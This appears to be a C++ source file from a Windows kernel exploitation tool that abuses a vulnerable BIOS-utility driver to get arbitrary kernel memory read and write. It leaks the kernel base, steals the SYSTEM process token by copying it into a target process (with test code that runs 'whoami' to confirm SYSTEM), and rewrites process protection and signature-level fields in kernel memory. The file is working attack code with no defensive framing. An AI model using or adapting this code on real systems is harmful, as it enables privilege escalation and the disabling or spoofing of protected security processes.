#include "DriverLoader.h"
#include "CorMem.h"
#include "BiosToolCommonDriver.h"
#include "Log.hpp"
#include "Utils.hpp"
#include <psapi.h>
#include <filesystem>
#include <fstream>

#pragma comment(lib, "Psapi.lib")


auto 
DriverLoader::GetKernelBase() -> ULONG64
{
	auto enableDebugPrivilege = []() -> BOOLEAN {
		BOOLEAN bResult{ FALSE };
		NTSTATUS status = Utils::RtlAdjustPrivilege(20/*SeDebugPrivilege*/, TRUE, FALSE, nullptr);
		if (!NT_SUCCESS(status))
		{
			LOG("[-] Failed to adjust privilege. Error code: 0x" << std::hex << status << " line = " << __LINE__);
			return FALSE;
		}
		return TRUE;
		};

	if (!enableDebugPrivilege())
	{
		return 0;
	}

	LPVOID	drivers[1024]{};
	DWORD	cbNeeded{};
	if (EnumDeviceDrivers(drivers, sizeof(drivers), &cbNeeded) && cbNeeded < sizeof(drivers))
	{
		return reinterpret_cast<ULONG64>(drivers[0]);
	}

	return 0;
}

auto 
DriverLoader::InitializeDriver() -> BOOLEAN
{
	return g_BiosToolCommonDriver->Initialize();
}

auto 
DriverLoader::UninitializeDriver() -> VOID
{
	g_BiosToolCommonDriver->Uninitialize();
}


#define TEST 

BOOLEAN
DriverLoader::PrivilegeEscalation(
	ULONG64 SourceProcess,
	ULONG64 TargetProcess,
	ULONG	OffsetOfProcessToken)
{
	// Replace other driver classes.
	//std::unique_ptr<DriverProvider<BiosToolCommonDriver>> driverLoader = std::make_unique<BiosToolCommonDriver>();
	BOOLEAN bReturn{ FALSE };
	do 
	{
		
#ifdef TEST
		system("whoami");
		LOG("----------------------------------Fxxking System---------------------------------");
#endif
		ULONG64 systemToken = 0;
		if (!g_BiosToolCommonDriver->Read((PVOID)(SourceProcess + OffsetOfProcessToken), &systemToken, sizeof(systemToken)))
		{
			LOG("[-] KernelRead System Token address : " << std::hex << (SourceProcess + OffsetOfProcessToken) << std::dec);
			break;
		}
		//LOG("[+] System Token address : " << std::hex << (SourceProcess + OffsetOfProcessToken) << " value : " << systemToken << std::dec << std::endl);

		systemToken &= ~0xF; // Clear the low 4 bits, which are used for reference counting in the token structure

		if (!g_BiosToolCommonDriver->Write(reinterpret_cast<PVOID>(TargetProcess + OffsetOfProcessToken),
										   &systemToken,
										   sizeof(ULONG64)))
		{
			LOG("[-] KernelWrite Current Process Token address : " << std::hex << (TargetProcess + OffsetOfProcessToken) << std::dec);
			break;
		}

#ifdef TEST
		LOG("---------------------------------------------------------------------------------");
		LOG("[+] Privilege Escalation Successful!");

		system("whoami");
		LOG("-------------------------------------End-----------------------------------------");

		system("pause");
#endif
		bReturn = TRUE;
	} while (FALSE);
	
	return bReturn;
}

BOOLEAN 
DriverLoader::SetProcessProtection(
	ULONG64			Process, 
	ULONG			OffsetOfProtection,
	PS_PROTECTION*	Protection)
{
	BOOLEAN bReturn{ FALSE };
	do
	{
		// set protection
		if (!g_BiosToolCommonDriver->Write(reinterpret_cast<PVOID>(Process + OffsetOfProtection),
										   Protection,
										   sizeof(DriverLoader::PS_PROTECTION)))
		{
			LOG("[-] KernelWrite Current Process Protection address : " << std::hex << (Process + OffsetOfProtection) << std::dec);
			LOG("    - Protection Level: "	<< std::hex << static_cast<int>(Protection->Level) << std::dec);
			LOG("    - Protection Type: "	<< std::hex << static_cast<int>(Protection->Type) << std::dec);
			LOG("    - Protection Signer: " << std::hex << static_cast<int>(Protection->Signer) << std::dec);
			break;
		}
		/*else
		{
			LOG("[+] Successfully set process protection at address : " << std::hex << (Process + OffsetOfProtection) << std::dec);
			LOG("    - Protection Level: " << std::hex << static_cast<int>(Protection->Level) << std::dec);
			LOG("    - Protection Type: " << std::hex << static_cast<int>(Protection->Type) << std::dec);
			LOG("    - Protection Signer: " << std::hex << static_cast<int>(Protection->Signer) << std::dec);
		}*/
		
		bReturn = TRUE;
	} while (FALSE);

	return TRUE;
}

BOOLEAN 
DriverLoader::SetSignatureLevel(
	ULONG64 Process,
	ULONG	OffsetOfSignatureLevel, 
	PUCHAR	SignatureLevel)
{
	BOOLEAN bReturn{ FALSE };
	do
	{
		//UCHAR signatureLevel = 0xC; // SE_SIGNING_LEVEL_WINDOWS

		if (!g_BiosToolCommonDriver->Write(reinterpret_cast<PVOID>(Process + OffsetOfSignatureLevel),
										   SignatureLevel,
										   sizeof(UCHAR)))
		{
			LOG("[-] KernelWrite Current Process Signature Level address : " << std::hex << (Process + OffsetOfSignatureLevel) << std::dec);
			break;
		}
		
		bReturn = TRUE;
	} while (FALSE);

	return TRUE;
}
